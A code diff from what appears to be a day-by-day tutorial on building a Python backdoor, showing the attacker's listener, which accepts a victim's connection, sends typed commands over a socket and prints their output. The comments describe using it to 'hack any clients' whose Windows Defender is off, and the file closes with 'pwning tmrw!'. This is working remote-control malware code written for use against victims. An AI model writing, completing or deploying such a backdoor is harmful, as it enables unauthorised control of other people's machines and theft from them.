@@ -1,8 +1,6 @@
-# Day 9 - Creating the Shell
-# 1     Before we proceed to make the shell, let's think what are the commands that we needed for our goal.
-#       the common commands are 'cd' for changing directory and 'ls' for listing all the items in current directory.
-#       Additionally, we are going to create 'clear' and 'quit'
-      
+# Day 10 - Private shell commands (COMMAND PROMPT)
+# 1     We have successfully created the shell on the last lecture. Now we are going to create the commands for the shell function.
+
 import socket
 import json
 import subprocess # 2
@@ -66,20 +64,20 @@ def message_recv(size=8):
     return body
     
 
-def shell(): # 4
-    while True: # 5
-        command = input('Command Here: ') # 6
-        json_send(command) # 7
-        if command == 'cd':
+def shell():
+    while True:
+        command = input('Command Here: ')
+        json_send(command)
+        if command[:3] == 'cd ': # 2
             pass
-        elif command == 'ls':
+        elif command == 'ls': # 3
             pass
-        elif command == 'clear':
-            pass
+        elif command == 'clear': # 4
+            os.system('cls')
         elif command == 'quit':
-            break # 8
-        else: # 14
-            result = reliable_recv() # 15
+            break
+        else:
+            result = reliable_recv()
             print(result)   
 
 
@@ -93,7 +91,7 @@ def connection():
     exec(Path('client.py').read_text())
     #####   DELETABLE   #####
     client, ip = server.accept()
-    shell() # 3
+    shell() 
 
 
 connection()
@@ -101,21 +99,17 @@ connection()
 
 #########################
 
-# 2     before we start, we are going to add 2 new modules for this lecture. The os and subprocess module.
-# 3     calling the shell function inside the connection()
-# 4     new fucntion
-# 5     imagine how the terminal works, or even the command prompt in windows.. whenever you typed a commmand, there will be another available input for your next command.
-#       that's why we are making the shell always 'True'
-# 6     I assume that you already know these next codes.
-# 7     we are going to send the 
-# 8     if the input is quit. we have to stop the code immediately.
-# 14    we are adding one more recurse. Like what we did in the client.py, if nothing is selected from ['cd', 'ls',' 'clear', 'quit'], 
-#       then it means that, we have wrote a command for the command prompt in the backdoor and we are expecting to get a output.
-# 15    we are going to assign it to 'result'
-# 16    and we are going to print it.
-
-#       now we have managed to create the backdoor. we can now hack any clients with a low security protection. (turned off windows defender)
-
+# 2     list slicing. if from index 0-3 are 'cd ', it will remained as pass.
+#       commonly, we are giving the next command after cd, ie. 'cd Documents', 'cd my_folders', etc.
+#       have you noticed that there were a white space after 'cd'?, we have a purpose why we made it [:3].
+#       so that we can separate the next input that were written. ie. 'Downloads' from 'cd Downloads' or 'my_folder' from 'cd my_folder'
+#       and then we can perform the command on the other side (client.py).
+#       if you didn't understand. it's okay, you will definitely understand it later as we walk-trhough.
+# 3     in this lecture, we are performing the commands for command prompt. since 'ls' is not a proper command in the CMD(command prompt), we can skip for 'ls' for now.
+#       in the meantime, we can use the standard command for listing directories in CMD 'dir'
+# 4     this time, if the machine detects 'clear' as the input, it will be performing os.system('cls')
+#       remember that clear is also not acceptable in CMD, and supposedly be performing these scripts in the CMD (command prompt).
+#       .system() method is came from the os module. it will perform any given inputs like a normal terminal.
 #########################
 
 # pwning tmrw!
